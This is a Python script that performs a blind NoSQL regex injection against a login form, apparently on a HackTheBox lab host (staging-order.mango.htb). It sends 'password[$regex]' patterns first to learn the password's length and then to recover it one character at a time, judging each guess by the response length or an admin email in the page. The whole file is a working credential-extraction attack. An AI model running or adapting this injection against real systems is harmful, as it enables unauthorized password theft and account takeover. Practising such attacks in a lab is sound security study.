# to dig https://www.dailysecurity.fr/nosql-injections-classique-blind/
#!/bin/python

# importing the requests library 
import requests 
import time
import string
import sys
import itertools
import threading
import re

done = False
#here is the animation
def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rloading ' + c)
        sys.stdout.flush()
        time.sleep(0.1)

t = threading.Thread(target=animate)

class bcolors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def str_append(s, d):
    output = s
    output += d
    return output

def str_append_mines_one(s, d):
	output = s[:len(s) - 1]
	output += d 
	return output

wordlist = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&'~(),-/:;<=>@[]^_`{|}"
page = "http://staging-order.mango.htb/#"
password = ""
i = 0
j = 2

# t.start()

taille = 0

while 1:
    forge=".{"+str(taille)+"}";
    req={'username':'mango', 'password[$regex]':forge, 'login':'login'}
    resultat=requests.post(page,data=req)
    # print(req)
    if len(resultat.text) != 3380:
    	print ("length of the password is : ", taille)        
    	break
    taille+=1

taille -= 1
while i <= len(wordlist) and taille >= 0:

	send = password 
	send += ".{"
	send += str(taille)
	send += "}"

	data = {"username":"mango", "password[$regex]":send , "login":"login"}
	r = requests.post(page, data = data)
	if "admin@mango.htb" in r.text:
		password = str_append(password, wordlist[i])
		taille = taille - 1
		i = -1
	if "admin@mango.htb" in r.text and len(password) == 0:
		password = str_append(password, wordlist[i])
		taille = taille - 1
		i = -1
	else:
		password = str_append_mines_one(password, wordlist[i])
		print ("wordlist = ", wordlist[i])
		print ("password = ", password)
	i = i + 1

done = True
if len(password) > 1:
	print (wordlist)
	print ("password is : ", password)
else :
	print ("cant find any password")